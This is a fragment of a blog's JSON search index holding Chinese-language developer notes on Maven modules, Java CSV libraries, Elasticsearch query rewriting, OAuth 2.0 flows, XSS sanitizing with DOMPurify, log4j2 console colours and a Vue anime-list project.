方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"Properties 主要放置設定參數或使用者參數。 主要看${poi.version}。 \u003cdependency\u003e \u003cgroupId\u003eorg.apache.poi\u003c/groupId\u003e \u003cartifactId\u003epoi\u003c/artifactId\u003e \u003cversion\u003e${poi.version}\u003c/version\u003e \u003c/dependency\u003e ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:3:1","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"父子層 dependencies、dependencyManagement 這個是重點，以為跟我踩到的雷有點關係。 這邊會分父層(上層) pom.xml 和 子層(下層) pom.xml。 寫在父層pom.xml一定可以繼承到子層 pom.xml。 寫在dependencyManagement的套件可以選擇性讓子層pom.xml做依賴動作，但版本可以訂在父層 pom.xml，子層可以省略或強制改寫，但我建議不寫比較好管理。 這邊 maven 在父層做包檔動作，會把所有子層做動作。但是載子層目錄下做只會做子層動作，所以\u003cparent\u003e設定不能做錯。 ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:3:2","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"網路範例 maven-muilti-module-demo/mvn-parent at master · Quison/maven-muilti-module-demo 從上面我可以能知道 \u003cmodule\u003e的名稱可以放在依賴 dependencies tag。但不幸我都失敗了 ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:4:0","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"我踩到什麼雷? 最後發現是要加 Version，等等父層加也沒用。後來發現子層一定要加上去。但比較推薦用\u003cversion\u003e${project.version}\u003c/version\u003e，通常依賴版本應該都會跟 maven其他依賴版本一致ˋ，可以這樣設定。很多文章這邊都沒講清楚，雖然我也不知道為什麼，但找到原因就這邊紀錄一下。 這邊跟上面依賴規則跟我說的不太一樣，所以剛開始設定就會踩到這個雷，原理也不知道是什麼。 ","date":"2022-07-31","objectID":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/:4:1","tags":["maven","java","jar"],"title":"Maven 使用 Modules 載入 Project 的 Jar 方法","uri":"/blog/posts/Maven-%E4%BD%BF%E7%94%A8-Modules-%E8%BC%89%E5%85%A5-Project-%E7%9A%84-Jar-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"因為工作需求會用到，在找有沒有好用的套件，結果發現一大堆，但有空有使用在實作看看。 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:0:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"javacsv 使用Javacsv.jar的jar包操作csv檔案的方法 | 程式前沿 Javacsv实现Java读写csv文件_java_脚本之家 java 解析csv | 程式前沿 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:1:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"common-csv [Java] 使用Apache Commons CSV來讀寫CSV資料 – 猛禽洛的程式筆記庫 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:2:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"fastcsv osiegmar/FastCSV: High performance CSV reader and writer for Java. ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:3:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"opencsv 讀取CSV檔的方法 « Sam的程式筆記 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:4:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"神文章 https://zhaoxiaobin.net/SpringBoot/%E9%9B%86%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%BA%94%E7%94%A8/Java%E8%A7%A3%E6%9E%90csv%E6%96%87%E4%BB%B6/ 備份圖 Java生成csv文件 | 赵晓斌技术博客 Java解析csv文件 | 赵晓斌技术博客 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:5:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"整理後(sample3) java解析CSV文件三种方法(openCSV)_ha_lydms的博客-CSDN博客_java解析csv文件 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:6:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"super csv util - 你能推荐一個Java庫來讀取(並可能寫)CSV文件嗎? ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:7:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"jackson Add first version with just CSV SpringBoot - 使用 ObjectMapper 完成 json 和 Java Object 互相轉換 ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:8:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["Java"],"content":"效能速度 uniVocity/csv-parsers-comparison: Comparisons among all Java-based CSV parsers in existence ","date":"2022-07-31","objectID":"/blog/posts/Java-Csv-Library/:9:0","tags":["java"],"title":"Java Csv Library","uri":"/blog/posts/Java-Csv-Library/"},{"categories":["ElasticSearch"],"content":"最進 ES 升級原本 SQL不能用，這邊改寫原生語法，小記一下。 ","date":"2022-07-31","objectID":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/:0:0","tags":["ElasticSearch"],"title":"ElasticSearch sql 查詢改寫原生語法","uri":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/"},{"categories":["ElasticSearch"],"content":"改寫 ","date":"2022-07-31","objectID":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/:1:0","tags":["ElasticSearch"],"title":"ElasticSearch sql 查詢改寫原生語法","uri":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/"},{"categories":["ElasticSearch"],"content":"原程式 public List\u003cString\u003e findForES(String indexName, String beginColumnName, String where) throws Exception { HttpClient client = null; HttpPost httpPost = null; HttpResponse response = null; StringBuffer url = new StringBuffer(); String result = \"\"; List\u003cString\u003e resultList = null; try { client = HttpClients.custom().build(); url.append(ELASTICSEARCH_URL + \"_sql?sql=\"); url.append(\"select \" + beginColumnName); url.append(\" from \" + indexName.toLowerCase() + \"/\" + ELASTICSEARCH_TYPE ); url.append(where); logger.info(\"ES SQL:\" + url.toString()); httpPost = new HttpPost(url.toString().replaceAll(\" \", \"%20\")); httpPost.addHeader(\"Content-Type\", ES_CONTENT_TYPE_JSON); response = client.execute(httpPost); if(response.getStatusLine().getStatusCode() == 200) { result = EntityUtils.toString(response.getEntity(), \"UTF-8\"); if(StringUtils.isNotBlank(result)) { resultList = JsonUtil.jsonSkipToList(result); } } } catch (Exception e) { e.printStackTrace(); throw new Exception(e); } return resultList; } ","date":"2022-07-31","objectID":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/:1:1","tags":["ElasticSearch"],"title":"ElasticSearch sql 查詢改寫原生語法","uri":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/"},{"categories":["ElasticSearch"],"content":"改寫程式 此程式參考用就好，尚未不知道有什麼缺陷，請小心使用 public List\u003cString\u003e findForES(String index, String[] include, QueryBuilder queryBuilder) throws Exception { SearchRequest searchRequest = new SearchRequest(index); SearchSourceBuilder searchSourceBuilder = new SearchSourceBuilder(); if(include != null){ searchSourceBuilder.fetchSource(include, null); } searchSourceBuilder.query(queryBuilder == null ? QueryBuilders.matchAllQuery() : queryBuilder); searchSourceBuilder.from(0).size(5000); searchSourceBuilder.timeout(new TimeValue(60, TimeUnit.SECONDS)); searchRequest.source(searchSourceBuilder); SearchResponse response = client.search(searchRequest, RequestOptions.DEFAULT); List\u003cString\u003e list = new ArrayList\u003c\u003e(); response.getHits().forEach(hit -\u003e list.add(hit.getSourceAsString())); return list; } ","date":"2022-07-31","objectID":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/:1:2","tags":["ElasticSearch"],"title":"ElasticSearch sql 查詢改寫原生語法","uri":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/"},{"categories":["ElasticSearch"],"content":"參考文章 ElasticSearch的基本原理与用法 - Boblim - 博客园 彻底搞懂 Elasticsearch Java API - 云+社区 - 腾讯云 使用Java Low Level REST Client操作elasticsearch - ~冰 - 博客园 High Level REST Client（6.3.x） [Elasticsearch] 深入搜索 | 小信豬的原始部落 https://blog.csdn.net/hudeyong926/article/details/120059127 https://www.elastic.co/guide/en/elasticsearch/client/java-rest/6.3/java-rest-high-query-builders.html https://blog.51cto.com/xpleaf/2294268 https://iter01.com/612169.html https://www.cnblogs.com/yjmyzz/p/elasticsearch_7_tutorial_2.html https://cloud.tencent.com/developer/article/1833288 https://cloud.tencent.com/developer/article/1833288 https://www.cnblogs.com/ginb/p/8716485.html ","date":"2022-07-31","objectID":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/:2:0","tags":["ElasticSearch"],"title":"ElasticSearch sql 查詢改寫原生語法","uri":"/blog/posts/ElasticSearch-sql-%E6%9F%A5%E8%A9%A2%E6%94%B9%E5%AF%AB%E5%8E%9F%E7%94%9F%E8%AA%9E%E6%B3%95/"},{"categories":["ElasticSearch"],"content":"沒紀錄完，有空回來筆記。 正牌索引 倒排索引 (5) 007 Elasticsearch 7.8.0 入门 倒排索引 - YouTube Lucene 倒排索引原理 - 掘金 ","date":"2022-07-31","objectID":"/blog/posts/ElasticSearch-%E5%89%8D%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E6%9D%B1%E8%A5%BF/:0:0","tags":["elasticsearch"],"title":"ElasticSearch 前需要了解東西","uri":"/blog/posts/ElasticSearch-%E5%89%8D%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E6%9D%B1%E8%A5%BF/"},{"categories":["程式心法"],"content":"Oauth 2.0 小記，有些沒紀錄完整，有空回來補。 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:0:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"上課小記 怕課堂上的課忘記或先前錯誤觀念，簡單小記。 OAuth 2.0 常見有四種流程 Authorization Code Flow 簡單敘述，最安全，使用者 Resouce Owner 是人，前面主要先取得授權碼(Authorization Code)再跟 Client(AP Server)去跟 Oauth Provider 去要 token 動作，使用者不會知道 token 資料。state 是 client 要去做判斷，防止 DDOS 被破解攻擊。 Implicit Flow 通常純前端使用，但沒有用到 Secret ID ，因為用了就不安全。相對密碼就給別人看，純前端使用 Authorization Code Flow 非常危險。 這個相對第一個流程沒有取得 Authorization Code 去換，當然安全性會比第一種方法危險一點。(如意被XSS 攻擊，讓使用者 token 惡意 JS 被偷走) 沒有 refresh token 。 Resource Owner Password Flow 不需要 refresh token。Client 讓使用者輸入帳號、密碼，最後程式做完要清除掉，此方法已經在 Oauth 2.1 被廢除。 Client Credentials Flow 當 Resource Owner 不是人，程式進行溝通不需要做授權確認，可採取方式。有點像帳號密碼登入。 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:1:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"相關名詞筆記 OIDC(OpenID Connect) 接近使用 OAuth 2.0 模式實作，OAuth 2.0 取得 Token(Access Token)，可一併取得 ID TOKEN。 ID TOKEN 是一種 JWT 格式，裡面存放使用者資料。 JWT 一種簽章過格式，可以驗證 payload 是否被串改，達到資料可驗證(使用私鑰)。但這不是對資料加密。 可以把 JWT 貼到JSON Web Tokens - jwt.io上面資訊看內容。 URL Fragment http://xxxx/#abc=123，透過 hash 使用帶一些內容，但是這些內容不會傳到後端。 Implicit Flow 最後回傳接收參數是使用URL Fragment，這種方式資料不會傳送到 server 上面。 Device Client(指的電視、硬體裝置)會先去 Authorization Endpoint 去要依些資料，如Device Code、驗證碼等等資訊。 可參考:Authorizing OAuth Apps - GitHub Docs IdentityServer4 ，正常 Auth Provider 不會有註冊會員功能，他只有時實作使用者登入、權杖(OAuth、OIDC)。剛開始我以為可以不用做註冊密碼，因該這些功能都會包進去，但老師說正常不會有這些實作，有點像 Middleware 概念，我後來有仔細思考，確實不該有這個功能。 可以看這張圖The Big Picture — IdentityServer4 1.0.0 documentation，結論還是乖乖做註冊會員XD。 網路找到現有範例benscabbia/identityserver4-dockersample-dotnetcore-nginx: IdentityServer4, ASP.NET Core, NGINX, HTTPS, Docker Compose ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:2:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"細說流程圖 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:3:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Authorization Code Flow Resource owner =\u003e 人 User-agent =\u003e 瀏覽器(Chrome) Client =\u003e WEB 後端程式 圖片參照:OAuth 2.0 and OIDC workflows - IBM Documentation user-agent 瀏覽器會發送 Request 到 Client 後端程式。Client 會導向 (Redirect) Authorization Server。 如果使用者未登入到 Authorization Server，會讓使用者登入資訊，在做授權動作。 授權完動作，使用者拿到 Authorization code ，傳送到Client程式。 Client 程式會發送 authorization code 和 redirect URI。 取得 Access Token ，這邊看文件有沒有 refresh token。 4和5流程就不詳細化畫流程。 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:3:1","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Implicit 隱碼 詳細流程可看:OAuth 2.0 筆記 (4.2) Implicit Grant Flow 細節 – Yu-Cheng Chuang’s Blog 簡單記錄我的小記 (A). 最下面紅色箭頭(User-Agent訪問 Client)，回傳到User-Agent，導向 Authorization Server 。藍線 Redirect 到 User-Agent 讓使用者(Resource Owner) 做登入動作。 (B). 使用者(Resource Owner)輸入帳號密碼，導向Authorization Server 做授權動作。 (C). 授權後會 Redirect URI with Fragment 到 User-Agent。 (D). 導向 Web 前端頁面，注意 URL (#)後面資訊不會傳到 Server上面。 (E)(F). Script 去抓 Access Token。 (G). Access Token 訪問 Resource Server。 parse location (fragment 資料) https://stackoverflow.com/questions/12271736/javascript-access-to-location-headers-url-fragment-for-oauth-2 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:3:2","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Client Credentials Grant 可參考:OAuth 2.0 筆記 (4.4) Client Credentials Grant Flow 細節 – Yu-Cheng Chuang’s Blog 簡單說明就是，Resource Owner 不是人，和當下使用者無法做 Authorization 時候，可以採用這個模式。 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:3:3","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Device Code User Code 指的是驗證碼。 Client 使用 Secret Id 去訪問 Authorization Server 取得 Device_id \u0026 User Code。 導頁 user 讓使用者輸入驗證碼頁面 持續 pull client_id,device_code,grant_type=device_code 訪問 Authorization Server 取得 Access Token Step 1: App requests the device and user verification codes from GitHub ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:4:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"查看特別案例 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:5:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Line Notify 手機頁面自動登入 Line Notify 手機點選登入，可以自動登入，我發現他是使用 Line APP 做登入的。注意這邊我發現要用預設瀏覽器才不會有問題，導向 LINE APP時候再跳回瀏覽器是開「預設瀏覽器」，才能做到自動登入。目前猜測是state寫在sessions那邊。 ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:5:1","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"state 可使用 session_id 可看上參考，沒有expire，可以多存變數使用。 State parameter ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:5:2","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"彩蛋 Electron系列文章 - deeplink打开应用 - FlyKnows 【雜談】 今天就來點閒聊吧② - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 OAuth.com - OAuth 2.0 Simplified ","date":"2022-07-31","objectID":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/:6:0","tags":["oauth"],"title":"Oauth 2.0 小記","uri":"/blog/posts/Oauth-2-0-%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"LIFF 測試好用工具。 \u003cscript src=\"https://cdn.jsdelivr.net/npm/vconsole@3.2.0/dist/vconsole.min.js\"\u003e\u003c/script\u003e \u003cscript\u003e var vConsole = new VConsole(); \u003c/script\u003e ","date":"2022-07-31","objectID":"/blog/posts/%E5%A5%BD%E7%94%A8%E6%89%8B%E6%A9%9F%E6%B8%AC%E8%A9%A6-WEB-%E5%B7%A5%E5%85%B7-VConsole/:0:0","tags":["javascript","debug","web"],"title":"好用手機測試 WEB 工具(VConsole)","uri":"/blog/posts/%E5%A5%BD%E7%94%A8%E6%89%8B%E6%A9%9F%E6%B8%AC%E8%A9%A6-WEB-%E5%B7%A5%E5%85%B7-VConsole/"},{"categories":["Java"],"content":"使用 Validateor 做 Filter 動作。 ESAPI学习笔记 - Fish_Ou - 博客园 java - How to fix “Trust boundary violation -Security Issue” in Coverity (Security Tool similar to veracode) in Servlet? - Stack Overflow Validator (ESAPI 2.0.1 API) security - How to fix Trust Boundary Violation flaw in Java Web application - Stack Overflow ","date":"2022-07-31","objectID":"/blog/posts/Trust-Boundary-Violation-%E9%A2%A8%E9%9A%AA%E5%95%8F%E9%A1%8C/:0:0","tags":["java"],"title":"Trust Boundary Violation 風險問題","uri":"/blog/posts/Trust-Boundary-Violation-%E9%A2%A8%E9%9A%AA%E5%95%8F%E9%A1%8C/"},{"categories":["源碼掃描"],"content":"前端XSS 問題很難處理，雖然可能有做htmlencode相關處理，但是程式還是會被判有風險。這邊整理一下那些做法。 ","date":"2022-07-31","objectID":"/blog/posts/XSS-%E8%99%95%E7%90%86/:0:0","tags":["xss"],"title":"XSS 處理","uri":"/blog/posts/XSS-%E8%99%95%E7%90%86/"},{"categories":["源碼掃描"],"content":"DOMPurify 想說 OWASP 搞出這個東西應該有什麼可以解決方案。最後找到GitHub - ESAPI/owasp-esapi-js: An UNMAINTAINTED project originally exported from code.google.com/p/owasp-esapi-js. This project is deprecated. See the README.md for further details and possible alternatives.以廢棄不使用。 DEPRECATED - OWASP Enterprise Security API for JavaScript (ESAPI-JS) Potential Alternatives to ESAPI-JS (aka, ESAPI4JS) node-esapi - a minimal port of ESAPI-JS' output encoder that does not depend on bower and as of this writing (2021-03-30), has no known vulnerabilities. It does not include the validator or other portions of ESAPI-JS. DOMPurify - a DOM-only, XSS sanitizer for HTML, MathML, and SVG. Lots of additional alternatives if your project is not pure JavaScript. 所以使用DOMPurify。 DOMPurify 2.3.6 “Beastmaster”線上可以簡單測試過濾結果。 \u003ctr\u003e\u003ctd\u003etest\u003c/td\u003e\u003c/tr\u003e result: test \u003ctable\u003e \u003ctbody\u003e\u003ctr\u003e\u003ctd\u003etest\u003c/td\u003e\u003c/tr\u003e \u003c/tbody\u003e\u003c/table\u003e result: \u003ctable\u003e \u003ctbody\u003e\u003ctr\u003e\u003ctd\u003etest\u003c/td\u003e\u003c/tr\u003e \u003c/tbody\u003e\u003c/table\u003e 從上面得知 GitHub - cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo: 通过混淆命名空间绕过DOMPurify实现XSS - 安全客，安全资讯平台(https://www.anquanke.com/post/id/219089) OWASP JavaScript Security | OWASP Foundation ","date":"2022-07-31","objectID":"/blog/posts/XSS-%E8%99%95%E7%90%86/:1:0","tags":["xss"],"title":"XSS 處理","uri":"/blog/posts/XSS-%E8%99%95%E7%90%86/"},{"categories":["Java"],"content":"原本在想有沒有別的方案，但後來使用內部 sftp 上傳套件，所以就先把連結紀錄。 ","date":"2022-07-31","objectID":"/blog/posts/%E5%B0%8B%E6%89%BE-spring-boot-%E4%BD%BF%E7%94%A8-sftp-%E6%96%B9%E6%A1%88/:0:0","tags":["sftp","java","spring"],"title":"尋找 spring boot 使用 sftp 方案","uri":"/blog/posts/%E5%B0%8B%E6%89%BE-spring-boot-%E4%BD%BF%E7%94%A8-sftp-%E6%96%B9%E6%A1%88/"},{"categories":["Java"],"content":"小記連結 SFTP第三篇——Spring-Integration-Sftp实现 - 代码先锋网 Spring Integration sftp 技术专栏_小花荣的博客-CSDN博客 Spring Integration in Action學習筆記(1) | by Z-xuan Hong | Medium Spring Integration简介 | TONY’S TOY BLOG 9.1 声明一个简单的集成流 | 蓝蓝站点 Spring企业集成流 Spring Integration - 錵開や落幕 - 博客园 分布式锁神器：springboot 2.X+Redis整合 Spring Integration实现分布式锁 | 航行学园 Spring Integration实现分布式锁_caofeng2012的技术博客_51CTO博客 ","date":"2022-07-31","objectID":"/blog/posts/%E5%B0%8B%E6%89%BE-spring-boot-%E4%BD%BF%E7%94%A8-sftp-%E6%96%B9%E6%A1%88/:1:0","tags":["sftp","java","spring"],"title":"尋找 spring boot 使用 sftp 方案","uri":"/blog/posts/%E5%B0%8B%E6%89%BE-spring-boot-%E4%BD%BF%E7%94%A8-sftp-%E6%96%B9%E6%A1%88/"},{"categories":["Java"],"content":"最近用接的專案有用 maven，我發現可以在 VSCODE 開發成功，除了採到 Spring Boot MultipartFile.transferTo雷。不過修完後就沒有什麼問題。 ","date":"2022-07-31","objectID":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/:0:0","tags":["vscode","log4j2"],"title":"VSCode 設定 Java debug console 與 log4j2 hightlight","uri":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/"},{"categories":["Java"],"content":"設定 VScode Debug Console 主要加\"console\": \"internalConsole\",可以參考下面設定。 { \"type\": \"java\", \"name\": \"Launch springApplication\", \"request\": \"launch\", \"mainClass\": \"com.xxxx.spring.web.springApplication\", \"projectName\": \"spring_web\", \"cwd\": \"${workspaceFolder}/spring_web\", \"console\": \"internalConsole\", }, { 設定完執行程式可以看到下圖。但我覺得好像不太好看資訊。 ","date":"2022-07-31","objectID":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/:1:0","tags":["vscode","log4j2"],"title":"VSCode 設定 Java debug console 與 log4j2 hightlight","uri":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/"},{"categories":["Java"],"content":"Spring Boot 設定 Console 顏色 application.properties設定 spring.output.ansi.enabled=always 參考:菜鳥工程師 肉豬: Spring Boot 操控台印出彩色文字 console log ANSI color output 但只有變文字…，這不是我想要的。 ","date":"2022-07-31","objectID":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/:2:0","tags":["vscode","log4j2"],"title":"VSCode 設定 Java debug console 與 log4j2 hightlight","uri":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/"},{"categories":["Java"],"content":"設定 log4j highlight 顏色 log4j2.xml \u003cConfiguration\u003e \u003cProperties\u003e \u003cproperty name=\"LOG_HOME\" value=\"/PPKIS/logs\" /\u003e \u003cproperty name=\"LOG_PREFIX\" value=\"ppkis\" /\u003e \u003cproperty name=\"LOG_PATTERN\" value=\"%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n\" /\u003e \u003cproperty name=\"LOG_FORMAT_CONSOLE\"\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} %highlight{%-5level} [%t] %highlight{%c{1.}.%M(%L)}: %msg%n%throwable\u003c/property\u003e \u003cproperty name=\"KEEP_DAYS\" value=\"30d\" /\u003e \u003c/Properties\u003e \u003cAppenders\u003e \u003cConsole name=\"ConsoleAppender\" target=\"SYSTEM_OUT\" follow=\"true\"\u003e \u003cPatternLayout pattern=\"${LOG_FORMAT_CONSOLE}\" disableAnsi=\"false\" noConsoleNoAnsi=\"false\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"FileAppender\" fileName=\"${LOG_HOME}/${LOG_PREFIX}.log\" filePattern=\"${LOG_HOME}/${LOG_PREFIX}-%d{yyyy-MM-dd}-%i.log\"\u003e 人生充滿光明。:D 參考: springboot log4j2配置参考-highlight-IDE控制台彩色日志_绿林__的博客-CSDN博客 (11) Spring Boot 使用 Logback 或 Log4j2 | by Albert Hg | learning-from-jhipster | Medium springboot log4j2配置参考-highlight-IDE控制台彩色日志 - CodeAntenna ","date":"2022-07-31","objectID":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/:3:0","tags":["vscode","log4j2"],"title":"VSCode 設定 Java debug console 與 log4j2 hightlight","uri":"/blog/posts/VSCode-%E8%A8%AD%E5%AE%9A-Java-debug-console-%E8%88%87-log4j2-hightlight/"},{"categories":["Vue"],"content":"完成品:我的新番清單 因為先前用 jQuery 寫出來版本不能跟朋友討論最近新番。連結在這:201507新番表 我想實作可以類似可以討論作品，就做出這個玩意。 小記這版特點 使用 Github Action 更新清單 右鍵可以做動畫排名(中圖想到功能) 這邊看到功能有兩大項，一個是本季月番，另一個是總月番顯示內容 這個是我朋友開的 Issue，因為我朋友說不能跨季排名，這個非常不方便。這邊我原本煩惱要怎麼做比較好，原本想說多那個功能需要花七天時間，後來再想有沒有更好的做法，後來想到可以用模組化，大大減少我程式撰寫，花了三天時間完成(下班時間，一天大概2~3小時)。源碼:vue-myanimelist/MyAnimeList.vue at master · malagege/vue-myanimelist 可以用網址分享 可存檔功能，這也是我朋友開的 issue 